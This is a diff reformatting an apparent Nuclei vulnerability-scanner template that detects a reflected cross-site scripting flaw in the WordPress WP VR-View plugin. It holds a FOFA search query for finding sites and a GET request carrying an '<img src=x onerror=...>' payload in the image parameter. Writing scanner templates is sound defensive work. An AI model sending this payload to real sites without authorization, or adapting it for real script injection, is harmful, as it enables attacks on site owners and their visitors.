@@ -1,4 +1,5 @@
 id: wp-vr-view-xss
+
 info:
   name: WP VR-View Plugin - Cross-Site Scripting
   author: ritikchaddha
@@ -8,37 +9,42 @@ info:
   reference:
     - https://blog.mindedsecurity.com/2018/04/dom-based-cross-site-scripting-in.html
   metadata:
-    fofa-query: body="/wp-content/plugins/wp-vr-view/"
     max-request: 2
-  tags: vuln,wordpress,wp,wp-plugin,wp-vr-view,xss
+    fofa-query: body="/wp-content/plugins/wp-vr-view/"
+  tags: wp,wp-plugin,wordpress,wp-vr-view,xss,vuln
+
 flow: http(1) && http(2)
+
 http:
-  - matchers:
-      - internal: true
-        part: body
-        type: word
-        words:
-          - /wp-content/plugins/wp-vr-view
-    raw:
+  - raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-  - matchers:
-      - part: body
-        type: word
-        words:
-          - <img src=x onerror=alert(document.domain)>
-      - part: content_type
-        type: word
-        words:
-          - text/html
-      - status:
-          - 200
-        # digest: 4a0a00473045022100dd6e424606367248189efc350a8644e36570ec8d36229fc531c90c52ac19417d02207f7318e8c24761ea0d08d784de94258f8d677a8a533f2405985cff78fb4bfb03:922c64590222798bb761d5b6d8e72950
 
-        type: status
-    matchers-condition: and
-    raw:
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '/wp-content/plugins/wp-vr-view'
+        internal: true
+
+  - raw:
       - |
         GET /wp-content/plugins/wp-vr-view/asset/?image=<img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
         Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<img src=x onerror=alert(document.domain)>'
+
+      - type: word
+        part: content_type
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a0048304602210097322accd35bf12a8524f090bdbbad41494a8114c4d1b780d56ff8577c3a3baf022100bcec46ec2336fc5a723be6b0cb9bce18e4cb3d7b14a3eb709e88a4f04f0f152a:922c64590222798bb761d5b6d8e72950
